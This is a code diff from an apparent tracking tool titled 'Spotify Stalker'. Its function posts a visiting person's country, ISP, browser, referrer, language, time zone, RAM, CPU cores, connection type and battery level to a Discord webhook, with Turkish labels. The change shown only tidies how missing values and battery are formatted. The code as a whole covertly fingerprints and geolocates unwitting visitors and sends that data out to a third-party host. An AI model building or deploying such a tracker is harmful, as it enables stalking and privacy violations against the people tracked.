@@ -123,7 +123,7 @@ async function getGeoInfo(ip) {
 async function sendDiscordNotification(entry, title = 'Spotify Stalkeri !!!') {
   if (!DISCORD_WEBHOOK_URL) return;
   const flag = entry.country === 'Turkey' || entry.country === 'Türkiye' ? '🇹🇷' : '🌍';
-  const batteryIcon = entry.battery && entry.battery !== '?' ? (entry.battery > 50 ? '🔋' : '🔴') : '';
+  const batteryIcon = entry.battery && entry.battery !== '?' ? (parseInt(entry.battery) > 50 ? '🔋' : '🔴') : '';
   try {
     await axios.post(DISCORD_WEBHOOK_URL, {
       embeds: [{
@@ -136,10 +136,10 @@ async function sendDiscordNotification(entry, title = 'Spotify Stalkeri !!!') {
           { name: '🌐 Tarayıcı', value: entry.browser, inline: true },
           { name: '🔌 ISS', value: entry.isp, inline: true },
           { name: '🔗 Yönlendiren', value: entry.referrer?.substring(0, 50) || '-', inline: true },
-          { name: '🌍 Dil / Saat Dilimi', value: `${entry.lang || '?'} / ${entry.tz || '?'}`, inline: true },
-          { name: '⚙️ RAM / Çekirdek', value: `${entry.ram || '?'}GB / ${entry.cores || '?'}`, inline: true },
-          { name: `📶 Bağlantı / ${batteryIcon} Pil`, value: `${entry.net || '?'} / ${entry.battery ? entry.battery + '%' : '?'}`, inline: true },
-          { name: '📐 Ekran', value: `${entry.orientation || '?'}`, inline: true },
+          { name: '🌍 Dil / Saat Dilimi', value: `${entry.lang && entry.lang !== '?' ? entry.lang : '-'} / ${entry.tz && entry.tz !== '?' ? entry.tz : '-'}`, inline: true },
+          { name: '⚙️ RAM / Çekirdek', value: `${entry.ram && entry.ram !== '?' ? entry.ram + 'GB' : '-'} / ${entry.cores || '-'}`, inline: true },
+          { name: `📶 Bağlantı / ${batteryIcon} Pil`, value: `${entry.net && entry.net !== '?' ? entry.net : '-'} / ${entry.battery && entry.battery !== '?' ? entry.battery + '%' : '-'}`, inline: true },
+          { name: '📐 Ekran', value: `${entry.orientation && entry.orientation !== '?' ? entry.orientation : '-'}`, inline: true },
           { name: '⏰ Tarih', value: new Date(entry.time).toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul', hour12: false }), inline: true },
         ],
         footer: { text: 'Spotify Stalker · 37xw' },
